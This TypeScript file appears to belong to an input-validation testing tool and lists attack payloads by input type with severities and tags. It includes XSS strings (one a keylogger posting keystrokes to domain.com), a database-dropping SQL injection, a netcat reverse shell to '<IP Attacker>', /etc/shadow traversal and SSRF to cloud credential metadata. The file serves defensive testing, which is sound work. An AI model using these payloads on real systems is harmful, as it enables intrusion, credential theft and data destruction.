import { AttackPayload } from './attack-payload';
import { SeverityLevel } from '../severity-level';

export const STRING_ATTACKS: { [key: string]: AttackPayload[] } = {

    COMMON: [
        {
            severity: SeverityLevel.HIGH,
            messages: ['Basic XSS injection'],
            payload: '<script></script>',
            tags: ['xss', 'basic']
        },
        {
            severity: SeverityLevel.HIGH,
            messages: ['JavaScript keylogger through advanced XSS'],
            payload: `<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>`,
            tags: ['xss', 'advanced', 'keylogger']
        },
        {
            severity: SeverityLevel.HIGH,
            messages: ['SVG payload XSS injection'],
            payload: '<svgonload=alert(1)>',
            tags: ['xss', 'advanced', 'svg']
        },
        {
            severity: SeverityLevel.HIGH,
            messages: ['DIV payload XSS injection'],
            payload: 'Hello<div onpointerout="alert(45)">World</div>',
            tags: ['xss', 'advanced', 'div'],
        },
        {
            severity: SeverityLevel.HIGH,
            messages: ['Basic SQL injection'],
            payload: '"; DROP ALL DATABASES; --',
            tags: ['sql', 'basic']
        },
        {
            severity: SeverityLevel.HIGH,
            messages: ['Advanced MySQL injection'],
            payload: `1' ORDER BY 1--+`,
            tags: ['sql', 'mysql', 'advanced']
        },
        {
            severity: SeverityLevel.HIGH,
            messages: ['Advanced PostgreSQL injection'],
            payload: `';create table persistent (data varchar(200));--`,
            tags: ['sql', 'potgresql', 'advanced']
        },
        {
            severity: SeverityLevel.MEDIUM,
            messages: ['NodeJS RCE assuming eval() afterwards'],
            payload: `require("child_process").exec('nc <IP Attacker> 4445 -e /bin/sh')`,
            tags: ['eval', 'rce']
        },
        {
            severity: SeverityLevel.MEDIUM,
            messages: [`NodeJS RCE assuming eval() afterwards`],
            payload: `something%0Acat%20/etc/passwd`,
            tags: ['eval', 'rce']
        },
        {
            severity: SeverityLevel.MEDIUM,
            messages: [`XSS bypass attempt for Markdown parsers`],
            payload: `[a](javascript:prompt(document.cookie))`,
            tags: ['xss', 'markdown']
        },
        {
            severity: SeverityLevel.MEDIUM,
            messages: [`XSS bypass attempt for Markdown parsers`],
            payload: `[a](j a v a s c r i p t:prompt(document.cookie))`,
            tags: ['xss', 'markdown']
        },
        {
            severity: SeverityLevel.MEDIUM,
            messages: [`XSS bypass attempt for Markdown parsers`],
            payload: `[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)`,
            tags: ['xss', 'markdown']
        },
        {
            severity: SeverityLevel.MEDIUM,
            messages: [`XSS bypass attempt for Markdown parsers`],
            payload: `[a](javascript:window.onerror=alert;throw%201)`,
            tags: ['xss', 'markdown']
        },
        // Not possible now due to lack of output formatting
        /*{
            severity: SeverityLevel.LOW,
            messages: ['Oversized string size'],
            payload: 'x'.repeat(10*1024*1024),
            tags: ['overflow']
        }*/
    ],

    PATH_TRAVERSAL: [
        {
            severity: SeverityLevel.MEDIUM,
            messages: [`Extracting environment using dedicated process file`],
            payload: '/proc/self/environ',
            tags: ['path-traversal', 'lfi']
        },
        {
            severity: SeverityLevel.HIGH,
            messages: [`Extracting Linux hashed credentials in shadow file`],
            payload: '../../../../../../etc/shadow',
            tags: ['path-traversal', 'lfi']
        },
        {
            severity: SeverityLevel.LOW,
            messages: ['XSS attempt through file name'],
            payload: `<svg onload=alert(1)>.png`,
            tags: ['path', 'xss']
        }
    ],

    EMAIL: [
        {
            severity: SeverityLevel.HIGH,
            messages: ['RFC-compliant email bypass'],
            payload: '"><svg/onload=confirm(1)>"@domain.com',
        }
    ],

    IP: [
        {
            severity: SeverityLevel.MEDIUM,
            messages: ['No IPv4 restriction on localhost may cause SSRF on local services'],
            payload: `127.0.0.1`,
            tags: ['ssrf','network']
        },
        {
            severity: SeverityLevel.MEDIUM,
            messages: ['No IPv4 restriction on private ranges may cause internal network SSRF'],
            payload: `10.10.124.110`,
            tags: ['ssrf','network']
        },
        {
            severity: SeverityLevel.MEDIUM,
            messages: ['No IPv4 restriction on private ranges may cause internal network SSRF'],
            payload: `192.168.1.56`,
            tags: ['ssrf','network']
        },
        {
            severity: SeverityLevel.INFO,
            messages: ['Network IPv4 reserved address may cause unknown actions'],
            payload: `0.0.0.0`,
            tags: ['network']
        },
        {
            severity: SeverityLevel.LOW,
            messages: ['Network IPv4 reserved address may cause unknown actions'],
            payload: `255.255.255.255`,
            tags: ['network', 'broadcast']
        }
    ],

    HOSTNAME: [
        {
            severity: SeverityLevel.MEDIUM,
            messages: ['No local hostname restriction on may cause SSRF'],
            payload: `localhost`,
            tags: ['ssrf']
        }
    ],

    URI: [
        {
            severity: SeverityLevel.HIGH,
            messages: ['Joi URI without scheme allows JavaScript inclusion'],
            payload: `javascript:alert('')`
        },
        {
            severity: SeverityLevel.HIGH,
            messages: ['Fetching UNIX file content on server'],
            payload: 'file:///etc/passwd'
        },
        {
            severity: SeverityLevel.MEDIUM,
            messages: ['Port scan attempt using HTTP scheme with localhost'],
            payload: 'http://127.0.0.1:22',
            tags: ['ssrf']
        },
        {
            severity: SeverityLevel.MEDIUM,
            messages: ['Including SVG malicious image'],
            payload: 'http://brutelogic.com.br/poc.svg'
        },
        {
            severity: SeverityLevel.MEDIUM,
            messages: ['SSRF attack on AWS bucket'],
            payload: 'http://instance-data/latest/meta-data/iam/security-credentials/',
            tags: ['ssrf','aws']
        },
        {
            severity: SeverityLevel.LOW,
            messages: ['Reflected XSS in URL parameter'],
            payload: 'https://domain.com/search.html?query=<svg onload=alert(1)>&lang=en',
            tags: ['xss', 'reflected']
        }
    ]

};
